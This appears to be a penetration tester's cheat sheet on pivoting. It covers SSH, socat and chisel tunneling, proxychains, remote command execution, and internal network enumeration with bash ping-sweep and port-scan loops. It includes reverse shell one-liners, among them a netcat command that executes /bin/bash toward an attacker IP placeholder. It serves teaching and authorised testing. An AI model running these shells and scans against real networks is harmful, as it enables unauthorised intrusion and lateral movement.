# Pivoting
> 27.01.2024
---

## Port forwarding and Tunneling:

![[pivoting.webp]]

1. **SSH Tunneling:**
- Local Port Forwarding: `ssh -L [local_port]:[target_host]:[target_port] user@pivot_host`
- Remote Port Forwarding: `ssh -R [remote_port]:[target_host]:[target_port] user@pivot_host`

2. **Proxychains:**
- Install and configure Proxychains to route traffic through a series of proxy servers. Example usage: `proxychains command_to_run`

3. **Netcat (nc) and Socat:**
- Create a reverse shell: `nc -e /bin/bash [attacker_ip] [port]`
- Establish a tunnel with socat: `socat TCP-LISTEN:[local_port],fork TCP:[target_host]:[target_port]`

4. **Metasploit Framework:**
- Use modules like `exploit/multi/ssh/sshexec` to execute commands on a remote system.
- Meterpreter shells provide advanced pivoting capabilities.

5. **SSH Dynamic Port Forwarding:**
- `ssh -D [local_port] user@pivot_host`
- Configure your browser or other tools to use a SOCKS proxy on the specified local port.
 
6. **HTTP Tunneling with SSH:**
- Use tools like `corkscrew` to tunnel arbitrary TCP connections through an HTTP proxy.

7. **PowerShell Remoting:**
- Enable PowerShell Remoting on Windows systems and use `Enter-PSSession` or `Invoke-Command` to execute commands remotely.

8. **ProxyChains for Command Execution:**
- Use ProxyChains with various tools like nmap or curl to route traffic through proxy servers.

9. **WMI (Windows Management Instrumentation):**
- Use tools like `wmic` or PowerShell to execute commands on remote Windows systems.

10. **Reverse Shell with Ncat:**
- `ncat --exec "/bin/bash -i" -l -p [port]` on the attacker machine.
- `ncat [attacker_ip] [port]` on the victim machine.

11. **Tunneling with chisel:**
- Download [Chisel](https://github.com/jpillora/chisel/releases)
- On the victim machine : `./chisel server --reverse --port PORT`
- On the attacker machine: `./chisel client SERVER_IP:PORT R:TARGET_HOST:TARGET_PORT:REMOTE_PORT`

## Enumerate information stored in the network:

- `arp -a` this will show all the cached ip addresses that the network has communicated with and through.
- Static mapping can be found on the same in the /etc/hosts file of linux or `C:\Windows\System32\drivers\etc\hosts on Windows`
- `/etc/resolv.conf` also helps us to identify local DNS servers, which can be misconfigured to allow something like DNS Zone transfer attacks.
- On Windows, the easiest way to check the DNS servers for an interface is with `ipconfig /all`
- Linux has an equivalent command as an alternative to reading the resolv.conf file: `nmcli dev show`

**Internal ping sweep:**
```bash
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
```

**Port scanning with bash:***
```bash
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```
